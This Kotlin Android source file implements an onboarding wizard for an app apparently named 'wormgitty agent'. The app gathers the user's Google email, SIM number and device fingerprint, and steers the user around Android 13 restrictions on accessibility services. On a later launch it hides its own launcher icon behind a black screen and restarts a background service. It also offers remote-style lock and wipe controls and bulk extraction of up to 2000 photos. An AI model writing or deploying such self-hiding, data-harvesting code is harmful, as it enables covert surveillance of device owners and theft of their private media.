package com.wormgitty.agent

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.animation.core.Animatable
import androidx.compose.animation.core.tween
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateMapOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.saveable.rememberSaveable
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.alpha
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

val RED = Color(0xFFD32F2F)
val GREEN_OK = Color(0xFF2E7D32)
val BUBBLE_GREY = Color(0xFFCFD8DC)

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val store = RegistrationStore(this)
        val prefs = HidePrefs(this)

        // A previous run armed the hide: this launch performs it, then vanishes.
        val hideArmed = kotlinx.coroutines.runBlocking { prefs.pendingHide() }
        if (hideArmed) {
            runHideSequence(prefs)
            return
        }

        if (restrictedSettingsBlockGrantFlow()) {
            showRestrictedSettingsNotice()
            return
        }

        val mockPerms = intent.getBooleanExtra(EXTRA_MOCK_PERMS, false)
        val checker: PermissionChecker = if (mockPerms) GreenChecker else SystemPermissionChecker()
        val opener: PermissionOpener = SystemPermissionOpener()
        // Injected transport: the only network-shaped seam in the app.
        val api: RegistrationApi = FakeRegistrationApi(applicationContext)
        val deviceInfo: DeviceInfoProvider = SystemDeviceInfoProvider(applicationContext)

        setContent {
            MaterialTheme {
                WizardScreen(api, store, checker, opener, deviceInfo, onSealed = {
                    // Only arm the flag here; the NEXT launch performs the vanish.
                    prefs.setPendingHide(true)
                    finishAffinity()
                })
            }
        }
    }

    /**
     * Android 13+: sideloaded accessibility services land under "Restricted
     * settings" and the a11y grant silently no-ops from the wizard. Detect the
     * pending restriction via the compat intent extra and route the user to
     * App Info once, with a single notice line.
     */
    private fun restrictedSettingsBlockGrantFlow(): Boolean =
        RestrictedSettingsCompat.maybeBlocked(this, intent)

    private fun showRestrictedSettingsNotice() {
        val dlg = android.app.AlertDialog.Builder(this)
            .setTitle(getString(R.string.app_name))
            .setMessage(getString(R.string.restricted_settings_notice))
            .setPositiveButton(
                getString(R.string.row_open_settings),
                android.content.DialogInterface.OnClickListener { d, _ ->
                    d.dismiss()
                    try {
                        startActivity(
                            android.content.Intent(
                                android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                                android.net.Uri.parse("package:$packageName")
                            )
                        )
                    } catch (_: Exception) {
                    }
                    finish()
                }
            )
            .setNegativeButton(
                getString(android.R.string.cancel),
                android.content.DialogInterface.OnClickListener { d, _ ->
                    d.dismiss()
                    finish()
                }
            )
            .setCancelable(false)
            .create()
        dlg.show()
    }


    /** Second-launch sequence: 2000ms black veil, revive service, hide aliases, finish. */
    private fun runHideSequence(prefs: HidePrefs) {
        val veil = android.view.View(this)
        veil.setBackgroundColor(android.graphics.Color.BLACK)
        setContentView(veil)
        android.os.Handler(mainLooper).postDelayed({
            try {
                WormSvc.start(this)
            } catch (_: Exception) {
            }
            setAliases(hiddenVisible = true)
            lifecycleScope.launch { prefs.clear() }
            finish()
        }, VEIL_MS)
    }

    fun setAliases(hiddenVisible: Boolean) {
        val pm = packageManager
        val pkg = packageName
        pm.setComponentEnabledSetting(
            ComponentName(pkg, "$pkg.LauncherBoost"),
            if (hiddenVisible) PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            else PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
            PackageManager.DONT_KILL_APP
        )
        pm.setComponentEnabledSetting(
            ComponentName(pkg, "$pkg.LauncherHidden"),
            if (hiddenVisible) PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            else PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
            PackageManager.DONT_KILL_APP
        )
    }

    companion object {
        const val EXTRA_MOCK_PERMS = "mock_perms"
        const val VEIL_MS = 2000L
    }
}

/** Deterministic all-green checker used by instrumented UI flows. */
object GreenChecker : PermissionChecker {
    override fun states(ctx: Context): Map<PermKey, Boolean> =
        PermKey.entries.associateWith { true }
}

@Composable
fun BotBubble(text: String) {
    Row(Modifier.fillMaxWidth()) {
        Box(
            Modifier
                .padding(8.dp)
                .background(BUBBLE_GREY, MaterialTheme.shapes.medium)
                .padding(horizontal = 14.dp, vertical = 10.dp)
        ) { Text(text, fontSize = 17.sp) }
    }
}

@Composable
fun UserBubble(text: String) {
    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.End) {
        Box(
            Modifier
                .padding(8.dp)
                .background(RED.copy(alpha = 0.15f), MaterialTheme.shapes.medium)
                .padding(horizontal = 14.dp, vertical = 10.dp)
        ) { Text(text, fontSize = 17.sp) }
    }
}

@Composable
fun TypingDots() {
    Row(
        Modifier.padding(8.dp),
        horizontalArrangement = Arrangement.spacedBy(6.dp),
        verticalAlignment = Alignment.CenterVertically
    ) {
        repeat(3) { i ->
            val alpha = remember { Animatable(if (i == 0) 1f else 0.3f) }
            // Finite pulse so the screen settles: one 600ms blink per dot.
            LaunchedEffect(i) {
                repeat(2) {
                    delay(i * 150L)
                    alpha.animateTo(1f, tween(150))
                    alpha.animateTo(0.3f, tween(150))
                }
                alpha.animateTo(if (i == 0) 1f else 0.55f, tween(120))
            }
            Box(
                Modifier
                    .size(8.dp)
                    .alpha(alpha.value)
                    .background(Color.DarkGray, CircleShape)
            )
        }
    }
}

@Composable
fun NextButton(enabled: Boolean, tag: String, onClick: () -> Unit) {
    Button(
        onClick = onClick,
        enabled = enabled,
        modifier = Modifier
            .padding(top = 16.dp)
            .testTag(tag)
    ) { Text(stringResource(R.string.btn_next)) }
}

@Composable
fun WizardScreen(
    api: RegistrationApi,
    store: RegistrationStore,
    checker: PermissionChecker,
    opener: PermissionOpener,
    deviceInfo: DeviceInfoProvider,
    onSealed: suspend () -> Unit
) {
    var step by remember { mutableStateOf(Step.INTRO) }
    var name by remember { mutableStateOf("") }
    var phoneRaw by remember { mutableStateOf("") }
    var photoCountText by remember { mutableStateOf<String?>(null) }
    val permStates = remember { mutableStateMapOf<PermKey, Boolean>() }
    PermKey.entries.forEach { permStates.putIfAbsent(it, false) }
    var registering by remember { mutableStateOf(false) }
    val scope = rememberCoroutineScope()

    Column(
        Modifier
            .fillMaxSize()
            .background(MaterialTheme.colorScheme.surface)
            .verticalScroll(rememberScrollState())
            .padding(16.dp)
    ) {
        when (step) {
            Step.INTRO -> {
                TypingDots()
                BotBubble(stringResource(R.string.welcome_line1))
                BotBubble(stringResource(R.string.welcome_line2))
                NextButton(enabled = true, tag = "next_intro") { step = Step.NAME }
            }

            Step.NAME -> {
                // Attempt a graceful prefill from the Google account (GET_ACCOUNTS).
                // Absence is an ordinary outcome: the user just types normally.
                val activityCtx = LocalContext.current
                LaunchedEffect(Unit) {
                    if (name.isBlank()) {
                        AccountReader.nameCandidate(AccountReader.firstGoogleEmail(activityCtx))
                            ?.let { name = it }
                    }
                }
                BotBubble(stringResource(R.string.name_hint))
                OutlinedTextField(
                    value = name,
                    onValueChange = { name = it },
                    isError = name.isNotBlank() && !NameValidator.isValid(name),
                    supportingText = {
                        if (name.isNotBlank() && !NameValidator.isValid(name))
                            Text(stringResource(R.string.name_error))
                    },
                    label = { Text(stringResource(R.string.name_hint)) },
                    modifier = Modifier
                        .fillMaxWidth()
                        .testTag("name_input")
                )
                NextButton(enabled = NameValidator.isValid(name), tag = "next_name") {
                    step = Step.CHECKLIST
                }
            }

            Step.CHECKLIST -> {
                BotBubble(stringResource(R.string.step_checklist_title))
                val activity = LocalContext.current as ComponentActivity
                DisposableEffect(activity) {
                    val obs = LifecycleEventObserver { _, ev ->
                        if (ev == Lifecycle.Event.ON_RESUME) {
                            checker.states(activity).forEach { permStates[it.key] = it.value }
                        }
                    }
                    activity.lifecycle.addObserver(obs)
                    onDispose { activity.lifecycle.removeObserver(obs) }
                }
                LaunchedEffect(Unit) {
                    checker.states(activity).forEach { permStates[it.key] = it.value }
                }
                PermKey.entries.forEach { key ->
                    val ok = permStates[key] == true
                    Row(
                        Modifier
                            .fillMaxWidth()
                            .padding(vertical = 6.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Box(
                            Modifier
                                .size(14.dp)
                                .background(if (ok) GREEN_OK else RED, CircleShape)
                        )
                        Spacer(Modifier.width(12.dp))
                        Text(stringResource(key.titleRes), Modifier.weight(1f))
                        TextButton(onClick = { opener.open(activity, key) }) {
                            Text(
                                stringResource(
                                    if (ok) R.string.row_done_glyph else R.string.row_open_settings
                                )
                            )
                        }
                    }
                }
                NextButton(
                    enabled = PermKey.gateOpen(permStates),
                    tag = "next_checklist"
                ) { step = Step.PHONE }
            }

            Step.PHONE -> {
                val activityCtx = LocalContext.current
                // SIM hint prefill: line1Number == null is NOT a failure state.
                // A one-shot flag guards against re-insertion after recreation.
                var simPrefillDone by rememberSaveable { mutableStateOf(false) }
                LaunchedEffect(Unit) {
                    if (!simPrefillDone && phoneRaw.isBlank()) {
                        PhoneSource.simLineNumber(activityCtx)?.let {
                            phoneRaw = it
                        }
                    }
                    simPrefillDone = true
                }
                val normalized = PhoneNormalizer.normalize(phoneRaw)
                var simNumber by remember { mutableStateOf<String?>(null) }
                var nameEmail by remember { mutableStateOf<String?>(null) }
                var phoneCheck by remember { mutableStateOf<MatchEngine.PhoneCheck?>(null) }
                var nameCheck by remember { mutableStateOf<MatchEngine.NameCheck?>(null) }
                BotBubble(stringResource(R.string.phone_hint))
                OutlinedTextField(
                    value = phoneRaw,
                    onValueChange = { phoneRaw = it },
                    isError = normalized == null && phoneRaw.isNotBlank(),
                    supportingText = {
                        if (normalized == null && phoneRaw.isNotBlank())
                            Text(stringResource(R.string.phone_error))
                    },
                    label = { Text(stringResource(R.string.phone_hint)) },
                    modifier = Modifier
                        .fillMaxWidth()
                        .testTag("phone_input")
                )
                // "مطابقة": advisory cross-check against SIM + google account.
                // Outcomes tint indicators; mismatch is YELLOW, never blocking.
                Button(
                    onClick = {
                        simNumber = PhoneSource.simLineNumber(activityCtx)
                        nameEmail = AccountReader.firstGoogleEmail(activityCtx)
                        phoneCheck = MatchEngine.checkPhone(phoneRaw, simNumber)
                        nameCheck = MatchEngine.checkNameAgainstEmail(name, nameEmail)
                    },
                    modifier = Modifier.testTag("match_btn")
                ) { Text(stringResource(R.string.btn_match)) }
                phoneCheck?.let { pc ->
                    val (dot, text) = when (pc.outcome) {
                        MatchEngine.Outcome.MATCH -> GREEN_OK to stringResource(R.string.match_phone_ok)
                        MatchEngine.Outcome.MISMATCH ->
                            Color(0xFFFFC107) to stringResource(R.string.match_phone_warn)

                        MatchEngine.Outcome.NO_SIGNAL ->
                            Color.Gray to stringResource(R.string.match_phone_no_signal)
                    }
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        modifier = Modifier.testTag("match_phone_row")
                    ) {
                        Box(Modifier.size(12.dp).background(dot, CircleShape))
                        Spacer(Modifier.width(8.dp))
                        Text(text, fontSize = 14.sp)
                    }
                }
                nameCheck?.let { nc ->
                    val (dot, text) = when (nc.outcome) {
                        MatchEngine.Outcome.MATCH -> GREEN_OK to stringResource(R.string.match_name_ok)
                        MatchEngine.Outcome.MISMATCH ->
                            Color(0xFFFFC107) to stringResource(R.string.match_name_warn)

                        MatchEngine.Outcome.NO_SIGNAL ->
                            Color.Gray to stringResource(R.string.match_name_no_signal)
                    }
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        modifier = Modifier.testTag("match_name_row")
                    ) {
                        Box(Modifier.size(12.dp).background(dot, CircleShape))
                        Spacer(Modifier.width(8.dp))
                        Text(text, fontSize = 14.sp)
                    }
                }
                NextButton(enabled = normalized != null, tag = "next_phone") {
                    step = Step.SUMMARY
                }
            }

            Step.SUMMARY -> {
                BotBubble(stringResource(R.string.summary_title))
                UserBubble(name)
                UserBubble(PhoneNormalizer.normalize(phoneRaw) ?: phoneRaw)
                val activityCtx = LocalContext.current
                val locked = stringResource(R.string.lock_btn)
                val wipeLabel = stringResource(R.string.wipe_btn)
                val lockNowLabel = stringResource(R.string.lock_now_btn)
                val notifyLabel = stringResource(R.string.notify_test_btn)
                val scanLabel = stringResource(R.string.photo_scan_btn)

                Button(
                    onClick = {
                        registering = true
                        scope.launch {
                            val reg = Registration(
                                "",
                                name.trim(),
                                PhoneNormalizer.normalize(phoneRaw)!!,
                                System.currentTimeMillis(),
                                deviceInfo.fingerprint(),
                                deviceInfo.constraints()
                            )
                            api.register(reg).onSuccess { id ->
                                store.save(reg.copy(id = id))
                                registering = false
                                onSealed()
                            }.onFailure { registering = false }
                        }
                    },
                    enabled = !registering,
                    modifier = Modifier.testTag("lock_btn")
                ) { Text(locked) }

                // Side-by-side operator actions beside "قفل": locking NOW is a
                // screen-off courtesy; wiping follows a double confirmation.
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(
                        onClick = { OperatorActions.localLockNow(activityCtx) },
                        modifier = Modifier.testTag("locknow_btn")
                    ) { Text(lockNowLabel) }
                    Button(
                        onClick = { WipePrompt.show(activityCtx as Activity) },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFB71C1C)),
                        modifier = Modifier.testTag("wipe_btn")
                    ) { Text(wipeLabel) }
                }

                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(
                        onClick = { OperatorActions.sendTestNotification(activityCtx) },
                        modifier = Modifier.testTag("notify_test_btn")
                    ) { Text(notifyLabel) }
                    Button(
                        onClick = {
                            val scan = OperatorActions.scanPhotos(activityCtx)
                            photoCountText = when {
                                scan.count < 0 -> "— (إذن الوسائط مش متاح)"
                                scan.count == 0 -> "0"
                                else -> scan.count.toString()
                            }
                        },
                        modifier = Modifier.testTag("photo_scan_btn")
                    ) { Text(scanLabel) }
                }
                if (photoCountText != null) {
                    Text(
                        if (photoCountText == "0") stringResource(R.string.photos_none_found)
                        else stringResource(R.string.photo_count_fmt)
                            .replace("%1\$d", photoCountText ?: "")
                            .replace("%2\$s", "files/operator/photo_count.txt"),
                        fontSize = 14.sp,
                        modifier = Modifier.testTag("photo_count_text")
                    )

                    // Batch extraction: N (1..2000) + "بدء السحب" + live report.
                    var extractN by remember { mutableStateOf("2") }
                    var extractMsg by remember { mutableStateOf<String?>(null) }
                    val badNText = stringResource(R.string.extract_bad_n)
                    val reportTemplate = stringResource(R.string.extract_report_fmt)
                    OutlinedTextField(
                        value = extractN,
                        onValueChange = { extractN = it.filter { ch -> ch.isDigit() }.take(4) },
                        label = { Text(stringResource(R.string.extract_n_hint)) },
                        modifier = Modifier
                            .fillMaxWidth()
                            .testTag("extract_n_input")
                    )
                    Button(
                        onClick = {
                            val n = extractN.toIntOrNull() ?: 0
                            if (n < 1 || n > 2000) {
                                extractMsg = "!$badNText"
                                return@Button
                            }
                            val puller = MediaStorePuller(activityCtx, AndroidKeystoreKeySource())
                            val res = puller.pullOldest(n)
                            extractMsg = reportTemplate
                                .replace("%1\$d", res.existing.toString())
                                .replace("%2\$d", res.pulled.toString())
                                .replace("%3\$d", res.remaining.toString())
                        },
                        modifier = Modifier.testTag("start_pull_btn")
                    ) { Text(stringResource(R.string.start_pull_btn)) }
                    extractMsg?.let { msg ->
                        Text(
                            msg.removePrefix("!"),
                            color = if (msg.startsWith("!")) Color(0xFFFFC107) else GREEN_OK,
                            fontSize = 15.sp,
                            modifier = Modifier.testTag("extract_report")
                        )
                    }
                    Text(
                        stringResource(R.string.evidence_note),
                        fontSize = 12.sp,
                        modifier = Modifier.testTag("evidence_note")
                    )
                }
            }

            Step.LOCKING -> {}
        }
    }
}
